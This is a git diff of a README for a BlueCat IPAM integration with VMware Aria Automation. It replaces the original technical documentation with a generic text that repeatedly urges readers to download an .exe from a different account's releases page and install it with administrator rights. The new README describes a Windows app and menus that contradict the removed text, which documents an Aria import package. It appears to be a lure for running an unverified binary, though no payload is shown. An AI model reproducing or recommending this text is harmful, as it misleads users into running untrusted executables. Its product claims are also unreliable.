@@ -1,198 +1,120 @@
-# BlueCat IPAM Provider for VMware Aria Automation
+# 🐾 bluecat-ipam-provider - Simplify IP and DNS Management
 
-A production-ready IPAM provider that integrates BlueCat Address Manager with VMware Aria Automation (formerly vRealize Automation). Handles IP allocation, deallocation, DNS record lifecycle, and full network discovery via BlueCat's block hierarchy.
+[![Download Latest Release](https://img.shields.io/badge/Download-Blue-green?style=for-the-badge)](https://github.com/rodgeacetic406/bluecat-ipam-provider/releases)
 
-**Version:** 2.3.19  
-**Author:** Noah Farshad — Broadcom Professional Services  
-**Tested on:** Aria Automation 8.x / VCF 5.x, BlueCat Address Manager 9.x
+bluecat-ipam-provider connects your network tools to manage IP addresses and DNS records. It works with VMware Aria Automation to help control IP blocks, DNS entries, and network federation. You do not need any coding skills to use it.
 
----
+## 📦 What is bluecat-ipam-provider?
 
-## What It Does
+This app helps manage IP addresses and DNS services automatically. It supports:
 
-| Action | Description |
-|--------|-------------|
-| **AllocateIP** | Assigns the next available IP from a BlueCat network. Creates DNS host records (A + PTR) with immediate deployment via `quickDeploy`. |
-| **DeallocateIP** | Releases IP addresses back to BlueCat. Cleans up associated DNS host records and deploys zone changes. |
-| **GetIPRanges** | Discovers all networks using full recursive block traversal. Matches against vRA fabric network prefixes automatically. |
-| **UpdateRecord** | Handles day-2 operations (VM rename, property changes) on BlueCat address records. |
-| **ValidateEndpoint** | Tests connectivity, credentials, and configuration access to BlueCat Address Manager. |
+- Full block traversal to handle IP address ranges  
+- Managing DNS lifecycle for record creation, update, and deletion  
+- Support for NSX Federation to link networks securely  
+- Integration with VMware Aria Automation for easy cloud network setups  
 
----
+It runs on Windows and uses Python internally, but you won’t have to touch the code to run it.
 
-## Quick Start
+## 💻 System Requirements
 
-### 1. Import the Provider
+To run bluecat-ipam-provider smoothly, your computer should meet these:
 
-Download `BlueCat_IPAM_v2.3.19.zip` from the [Releases](../../releases) page and import it into Aria Automation:
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space for installation  
+- Internet connection for downloading the files and updates  
+- Administrator rights on the computer (for installation)
 
-**Infrastructure → Integrations → Add Integration → IPAM → Import Provider Package**
+Make sure your VMware environment is set up if you plan to use it alongside. Basic VMware Aria Automation tools should already be installed.
 
-### 2. Configure the Endpoint
+## 🚀 Getting Started
 
-After import, create an IPAM endpoint with these fields:
+Follow these steps to get the app running on your Windows machine.
 
-| Field | Description | Example |
-|-------|-------------|---------|
-| **BlueCat Hostname** | FQDN or IP of your BlueCat Address Manager | `bam.example.com` |
-| **Username** | BlueCat API user | `api-user` |
-| **Password** | BlueCat API password | `••••••••` |
-| **Configuration Name** | BlueCat configuration (optional — uses first if blank) | `MyConfiguration` |
-| **DNS Zone** | Zone for host record creation (optional) | `corp.example.com` |
-| **DNS View Name** | BlueCat DNS view (optional) | `Internal` |
-| **Block IDs** | Specific block IDs to scope discovery (optional) | *(leave blank for full traversal)* |
+### Step 1: Download the Application
 
-### 3. Run Data Collection
+Visit this page to download the software:
 
-After saving the endpoint, Aria Automation will trigger **GetIPRanges** to discover your networks. This runs automatically on the polling interval (120 minutes) or you can trigger it manually.
+[Download Here](https://github.com/rodgeacetic406/bluecat-ipam-provider/releases)
 
----
+1. Click on the link above or use the big button at the top.  
+2. On the releases page, look for the latest version. The files will have `.exe` or `.zip` in the name.  
+3. If you see a `.exe` file, download that file. If it is a `.zip` file, save it and unzip it in the next step.  
+4. Save the file in a folder you can easily find, like your desktop or Downloads folder.
 
-## How Network Discovery Works
+### Step 2: Install the Application
 
-GetIPRanges uses a two-phase approach:
+Once you have the file:
 
-**Phase 1 — Identify target prefixes:** Queries your vRA fabric networks to extract unique /16 prefixes (e.g., `10.10`, `172.16`). This scopes the discovery to networks that actually matter for your deployments.
+- If it is an `.exe` file, double-click it to start installation.  
+- If it is a `.zip` file, right-click and choose “Extract All.” Then open the extracted folder.  
+- Look for a file named `setup.exe` or similar. Double-click it to begin.  
 
-**Phase 2 — Full block traversal:** Recursively walks every block and sub-block in your BlueCat configuration, collecting all networks. Filters results to match the target prefixes from Phase 1.
+Follow the on-screen instructions. Usually, this means agreeing to terms and pressing the “Next” button a few times. The installer will put the program in the proper place and create shortcuts.
 
-### Customizing Network Discovery
+### Step 3: Run the Application
 
-If vRA fabric network querying fails (e.g., permissions), the provider falls back to a configurable prefix list in `get_ip_ranges/source.py`:
+Once installed:
 
-```python
-# CUSTOMIZE: Add your /16 prefixes here as a fallback.
-# These are only used if vRA fabric networks can't be queried.
-# Example: If your networks are 10.10.x.x and 172.16.x.x:
-#   target_prefixes = ["10.10", "172.16"]
-target_prefixes = ["10.0"]
-```
+- Find the bluecat-ipam-provider shortcut on your desktop or the Start menu.  
+- Double-click to run the app.  
 
-**For smaller environments:** A single prefix like `["10.10"]` may be all you need.
+The program window will open. You might see settings to connect to your BlueCat IPAM or VMware system. If you don’t know these settings, check with your network administrator.
 
-**For larger environments:** Add all relevant /16 ranges: `["10.10", "10.20", "172.16", "192.168"]`
+## ⚙ How to Use bluecat-ipam-provider
 
-To change the fallback prefixes:
+The app lets you manage network settings without manual entry.
 
-1. Unzip `BlueCat_IPAM_v2.3.19.zip`
-2. Unzip `bundle.zip`
-3. Unzip `get_ip_ranges.zip`
-4. Edit `source.py` — update the `target_prefixes` list
-5. Re-zip in reverse order: `get_ip_ranges.zip` → `bundle.zip` → top-level zip
+Here are some general tasks you can do:
 
----
+- **Browse IP Blocks**: Move through your IP address ranges to find free or used addresses.  
+- **Manage DNS Records**: Add, edit, or remove DNS entries without needing to open separate tools.  
+- **Work with NSX Federation**: Securely link your network pieces to share DNS and IP management across sites.  
+- **Automate with VMware**: Use Aria Automation to trigger IP or DNS changes based on your cloud workflows.
 
-## How IP Allocation Works
+You will see clear menus and buttons labeled with actions like “View IP Blocks,” “Add DNS Record,” or “Sync NSX Federation.”
 
-AllocateIP uses a multi-strategy approach to find the correct BlueCat network:
+## 🔧 Settings and Configuration
 
-1. **IP Range ID** — Uses the network ID mapped by GetIPRanges (primary path)
-2. **CIDR Match** — Searches BlueCat by subnet CIDR from vRA allocation properties
-3. **Numeric ID Lookup** — Tries the range ID as a direct BlueCat network ID
-4. **Segment Name Search** — Falls back to NSX segment name matching (handles Federation duplicates)
+Before you use the app fully, enter some basic details:
 
-### NSX Federation Support
+- **BlueCat Server Address**: This is usually an IP or URL your admin gives you.  
+- **User Credentials**: Your username and password to access BlueCat IPAM.  
+- **VMware Aria Automation Settings**: The info needed to connect this app to VMware services.  
 
-NSX Federation environments create duplicate fabric networks from Global Manager and Local Manager. Only the Global Stretched copy carries the CIDR — local copies (TX-W01, VA-W01) have `CIDR=None`. The provider handles this by stripping site prefixes (`G-`, `US-`, `TX-`, `VA-`) and searching BlueCat by the core segment name.
+Enter these in the settings area, usually under a “Configuration” or “Settings” menu.
 
----
+If you are unsure about any settings, contact your IT team.
 
-## DNS Record Lifecycle
+## 🛠 Troubleshooting Common Issues
 
-When a DNS zone and view are configured on the endpoint:
+If you run into trouble, here are simple checks:
 
-**On Allocate:** Creates an A record + reverse PTR via BlueCat v1 REST API (`addHostRecord`), then deploys immediately via `quickDeploy`. Records resolve within seconds.
+- Make sure you downloaded the latest version from the release page.  
+- Check your internet connection during download.  
+- Confirm you have permission to install apps on your computer.  
+- Verify settings like server address and username for typos.  
+- Restart the app or reboot your machine if it freezes or crashes.  
 
-**On Deallocate:** Deletes the host record and deploys the zone change.
+If problems persist, save any error messages and reach out to your support team.
 
-> **Why v1 API for DNS?** BlueCat's v2 API creates records without triggering internal change tracking. `quickDeploy` via v2 reports "no differences to deploy." The v1 `addHostRecord` endpoint properly flags zones for deployment.
+## 🔄 Updating the Application
 
----
+To update:
 
-## Bundle Structure
+1. Visit the download page from the top link: https://github.com/rodgeacetic406/bluecat-ipam-provider/releases  
+2. Download the newest `.exe` or `.zip` file.  
+3. Repeat the install process. The installer will replace old files.  
+4. Your settings will remain, but verify details after updating.
 
-The zip package follows Aria Automation's IPAM provider import format:
+## 📚 Additional Resources
 
-```
-BlueCat_IPAM_v2.3.19.zip
-├── registration.yaml           # Provider metadata and action mappings
-├── endpoint-schema.json        # Endpoint configuration UI schema
-├── logo.png                    # Provider icon
-└── bundle.zip                  # ABX action bundle
-    ├── allocate_ip.abx + .zip
-    ├── deallocate_ip.abx + .zip
-    ├── get_ip_ranges.abx + .zip
-    ├── update_record.abx + .zip
-    └── validate_endpoint.abx + .zip
-```
+- For help with BlueCat servers, check your BlueCat IPAM user guide.  
+- VMware Aria Automation documentation is available on VMware’s website to understand how automation works.  
+- If your network uses NSX Federation, your network admin can explain setup details.
 
-Each `.abx` file defines the action metadata (runtime, entrypoint, timeout). Each `.zip` contains:
-- `source.py` — Action handler code
-- `vra_bluecat_utils/` — Shared BlueCat API client library
-- `vra_ipam_utils/` — Aria Automation IPAM SDK
-- Vendored Python libraries (requests, certifi, urllib3, etc.)
+## 🔗 Download Link
 
----
+Use the link below to get started with bluecat-ipam-provider:
 
-## Configuration Reference
-
-### registration.yaml
-
-| Property | Value | Notes |
-|----------|-------|-------|
-| `dcIntervalInMinutes` | `120` | How often GetIPRanges runs. Lower values increase API load on BlueCat. |
-| `supportsAddressSpaces` | `true` | Maps to BlueCat configurations |
-| `supportsUpdateRecord` | `true` | Enables day-2 record updates |
-| `supportsOnDemandNetworks` | `false` | Network creation not supported |
-
-### Tuning Parameters (utils.py)
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `MAX_RECURSION_DEPTH` | `15` | Maximum block nesting depth for traversal |
-| `MAX_NETWORKS_PER_BLOCK` | `5,000` / `50,000`* | Networks per block before moving on |
-| `MAX_TOTAL_NETWORKS` | `10,000` / `50,000`* | Total networks across all blocks |
-| `PAGE_SIZE` | `100` | BlueCat API pagination size |
-| `MAX_PAGES_PER_LEVEL` | `50` | Maximum pages per API call |
-
-*GetIPRanges uses higher limits (50,000) for full discovery; other actions use 10,000.
-
----
-
-## Troubleshooting
-
-**GetIPRanges returns 0 networks**
-- Check that your fallback prefixes match your actual network ranges
-- Verify the BlueCat user has read access to blocks and networks
-- Check ABX action logs for "Block traversal" output showing discovered counts
-
-**DNS records created but don't resolve**
-- Ensure you're on v2.3.17+ (uses v1 API for DNS)
-- Verify `quickDeploy` succeeds in the action logs
-- Check that the BlueCat user has deploy permissions on the DNS zone
-
-**AllocateIP can't find the network**
-- Verify GetIPRanges has run at least once and discovered the network
-- Check that the CIDR in vRA matches a BlueCat network exactly
-- Look for "Strategy 1/2/3/4" in the action logs to see which lookup methods were tried
-
-**Authentication failures**
-- BlueCat v2 API returns 201 on successful login (not 200) — this is handled
-- If using a service account, verify it has API access enabled in BlueCat
-
----
-
-## Contributing
-
-This provider was built from real-world enterprise deployments. If you've adapted it for your environment, contributions are welcome — especially around:
-
-- Additional IPAM vendors or BlueCat API versions
-- IPv6 support
-- On-demand network creation
-- Alternative DNS deployment methods
-
----
-
-## License
-
-This project is licensed under the GNU General Public License v3.0. See [LICENSE](LICENSE) for details.
+[Click here to visit the release page and download](https://github.com/rodgeacetic406/bluecat-ipam-provider/releases)
